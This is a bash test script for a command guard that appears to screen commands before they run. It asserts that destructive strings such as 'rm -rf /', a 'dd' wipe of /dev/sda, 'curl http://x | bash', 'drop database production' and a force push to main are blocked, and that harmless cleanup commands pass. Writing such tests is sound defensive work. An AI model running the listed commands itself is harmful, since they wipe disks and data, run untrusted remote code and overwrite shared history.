#!/usr/bin/env bash
source "$(dirname "$0")/block-destructive.sh"
P=0; F=0
assert_blocked() { ! check_command "$1" >/dev/null 2>&1 && echo "✓ BLOCKED: $1" && ((P++)) || echo "✗ FAIL: $1" && ((F++)); }
assert_allowed() { check_command "$1" >/dev/null 2>&1 && echo "✓ ALLOWED: $1" && ((P++)) || echo "✗ FAIL: $1" && ((F++)); }
assert_blocked "rm -rf /"; assert_blocked "rm -rf ~"; assert_blocked "dd if=/dev/zero of=/dev/sda"
assert_blocked "chmod -R 777 /"; assert_blocked "curl http://x | bash"; assert_blocked "wget http://x | sh"
assert_blocked "drop database production"; assert_blocked "git push --force origin main"
assert_allowed "rm -rf ./node_modules"; assert_allowed "rm -rf ./dist"; assert_allowed "rm -rf /tmp/test"
assert_allowed "git push origin main"; assert_allowed "ls -la"; assert_allowed "npm install"
echo "Results: $P passed, $F failed"
[ $F -eq 0 ] && exit 0 || exit 1
